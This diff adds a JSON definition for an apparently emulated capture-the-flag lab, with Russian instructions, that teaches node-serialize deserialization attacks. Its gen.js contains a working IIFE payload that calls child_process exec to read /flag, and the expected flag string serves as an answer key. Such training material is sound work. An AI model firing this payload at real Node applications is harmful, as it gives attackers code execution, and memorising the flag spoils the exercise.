@@ -1,0 +1,29 @@
+{
+  "id": "web-node-deser",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": { "file": "/home/student/task/found.txt", "contains": "nto{n0d3_s3r1al1z3_11f3}" },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    { "path": "/home/student/task/task.md", "text": "# Практика: node-serialize IIFE gadget\n\nNode-приложение `https://store.example` ставит cookie `profile` — base64 JSON,\nкоторый разбирает библиотека node-serialize (она выполняет строки-функции).\n\n1. Посмотри обычный профиль:\n\n   base64 -d profile.txt\n\n2. Сгенерируй вредоносный JSON скриптом `gen.js`:\n\n   node gen.js > payload.json\n\n3. Отправь его серверу:\n\n   curl -s https://store.example/ -H 'Content-Type: application/json' --data-binary @payload.json > found.txt\n\n4. Набери `check`.\n" },
+    { "path": "/home/student/task/profile.txt", "text": "eyJwcm9maWxlIjp7Im5hbWUiOiJib2IifX0=\n" },
+    { "path": "/home/student/task/gen.js", "text": "// node-serialize выполняет строки с префиксом _$$ND_FUNC$$_ (обёрнутые в IIFE)\nconst payload = {\n  profile: \"_$$ND_FUNC$$_function(){require('child_process').exec('cat /flag', function(e,o){console.log(o)})}()\"\n}\nconsole.log(JSON.stringify(payload))\n" }
+  ],
+  "tools": {
+    "node": {
+      "help": "node <скрипт> — интерпретатор Node.js (replay: запуск генератора node-serialize payload)",
+      "cases": [
+        { "match": "gen\\.js", "example": "gen.js", "output": "{\"profile\":\"_$$ND_FUNC$$_function(){require('child_process').exec('cat /flag', function(e,o){console.log(o)})}()\"}\n" }
+      ],
+      "fallback": "node: в этой лабе эмулируется только генератор payload (node gen.js).\n"
+    },
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция store.example)",
+      "cases": [
+        { "match": "@payload|payload\\.json|--data-binary", "example": "-s https://store.example/ --data-binary @payload.json", "output": "{\"status\":\"error\",\"message\":\"child_process: nto{n0d3_s3r1al1z3_11f3}\"}\n" },
+        { "match": "store\\.example", "example": "-s https://store.example/", "output": "{\"status\":\"ok\",\"profile\":{\"name\":\"bob\"}}\n" }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только https://store.example/.\n"
+    }
+  }
+}
